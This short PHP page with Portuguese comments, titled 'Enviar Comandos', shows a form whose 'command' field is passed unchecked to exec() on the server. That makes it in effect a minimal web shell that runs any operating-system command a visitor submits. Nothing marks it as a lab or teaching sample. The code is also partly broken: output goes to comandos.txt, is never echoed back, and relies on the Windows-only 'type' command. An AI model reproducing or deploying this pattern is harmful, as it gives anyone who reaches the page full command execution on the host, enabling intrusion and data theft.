<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Enviar Comandos</title>
</head>
<body>
    <h1>Enviar Comandos</h1>
    <form action="" method="post">
        <input type="text" name="command" placeholder="Digite o comando">
        <button type="submit">Enviar Comando</button>
    </form>
    <?php
    // Verifica se há um comando enviado pelo formulário
    if (isset($_POST['command'])) {
        // Pega o comando enviado
        $command = $_POST['command'];
        // Executa o comando no processo auto.cmd
        exec("$command > comandos.txt & type comandos.txt");
    }
    ?>
</body>
</html>
